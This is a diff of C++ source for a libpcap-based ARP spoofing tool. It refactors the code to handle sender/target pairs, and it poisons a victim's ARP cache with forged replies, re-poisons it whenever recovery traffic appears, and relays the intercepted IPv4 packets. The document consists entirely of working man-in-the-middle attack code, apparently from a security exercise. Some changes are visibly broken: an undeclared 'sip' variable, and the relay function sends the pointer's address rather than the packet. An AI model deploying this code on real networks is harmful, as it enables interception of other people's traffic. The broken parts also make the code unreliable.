@@ -42,7 +42,7 @@ void get_myinfo(char* interface){
     attacker.ip = Ip(ip);
 }
 
-Mac get_smac(pcap_t* handle){
+Mac get_smac(pcap_t* handle, Pair& pair){
     EthArpPacket packet;
 
     packet.eth_.dmac_ = Mac::broadcastMac();
@@ -78,16 +78,16 @@ Mac get_smac(pcap_t* handle){
         EthArpPacket* reply = (EthArpPacket*)packet;
         if (ntohs(reply->eth_.type_) != EthHdr::Arp) continue;
         if (ntohs(reply->arp_.op_) != ArpHdr::Reply) continue;
-        if (ntohl(reply->arp_.sip_) != sender.ip) continue;
+        if (ntohl(reply->arp_.sip_) != sip) continue;
 
         return Mac(reply->arp_.smac_);
     }
 }
 
-void infect_sender(pcap_t* handle){
+void infect_sender(pcap_t* handle, Pair& pair){
     EthArpPacket packet;
 
-    packet.eth_.dmac_ = sender.mac;
+    packet.eth_.dmac_ = pair.smac;
     packet.eth_.smac_ = attacker.mac;
 
     packet.eth_.type_ = htons(EthHdr::Arp);
@@ -98,9 +98,9 @@ void infect_sender(pcap_t* handle){
     packet.arp_.pln_ = Ip::SIZE;
     packet.arp_.op_ = htons(ArpHdr::Reply);
     packet.arp_.smac_ = attacker.mac;
-    packet.arp_.sip_ = htonl(target.ip);
-    packet.arp_.tmac_ = sender.mac;
-    packet.arp_.tip_ = htonl(sender.ip);
+    packet.arp_.sip_ = htonl(pair.tip);
+    packet.arp_.tmac_ = pair.smac;
+    packet.arp_.tip_ = htonl(pair.sip);
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
     if (res != 0) {
@@ -109,25 +109,25 @@ void infect_sender(pcap_t* handle){
     }
 }
 
-bool is_spoofed(const u_char* packet){
+bool is_spoofed(const u_char* packet, Pair& pair){
     PEthHdr eth_hdr = (PEthHdr)packet;
     if (eth_hdr->type_ != EthHdr::Ip4) return false;
-    if (eth_hdr->smac_ != sender.mac) return false;
+    if (eth_hdr->smac_ != pair.smac) return false;
     return true;
 }
 
-bool is_recover(const u_char* packet){
+bool is_recover(const u_char* packet, Pair& pair){
     PEthHdr eth_hdr = (PEthHdr)packet;
     if (eth_hdr->type_ != EthHdr::Arp) return false;
-    if (eth_hdr->smac_ != target.mac) return false;
-    if (eth_hdr->dmac_ != sender.mac) return false;
+    if (eth_hdr->smac_ != pair.tmac) return false;
+    if (eth_hdr->dmac_ != pair.smac) return false;
     return true;
 }
 
-void relay(pcap_t* handle, const u_char* packet){
+void relay(pcap_t* handle, const u_char* packet, Pair& pair){
     PEthHdr eth_hdr = (PEthHdr)packet;
     eth_hdr->smac_ = attacker.mac;
-    eth_hdr->dmac_ = target.mac;
+    eth_hdr->dmac_ = pair.tmac;
 
     PIpHdr ip_hdr = (PIpHdr)(packet + sizeof(EthHdr));
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthHdr)+ip_hdr->tlen);
@@ -137,8 +137,8 @@ void relay(pcap_t* handle, const u_char* packet){
     }
 }
 
-void arp_spoof(pcap_t* handle){
-    infect_sender(handle);
+void arp_spoof(pcap_t* handle, Pair& pair){
+    infect_sender(handle, pair);
     printf("Sender infected\n");
 
     while(true){
@@ -150,12 +150,12 @@ void arp_spoof(pcap_t* handle){
             fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
             exit(-1);
         }
-        if (is_recover(packet)){
-            infect_sender(handle);
+        if (is_recover(packet, pair)){
+            infect_sender(handle, pair);
             printf("Reinfect success\n");
             continue;
-        } else if (is_spoofed(packet)) {
-            relay(handle, packet);
+        } else if (is_spoofed(packet, pair)) {
+            relay(handle, packet, pair);
             printf("Relayed\n");
         }
     }
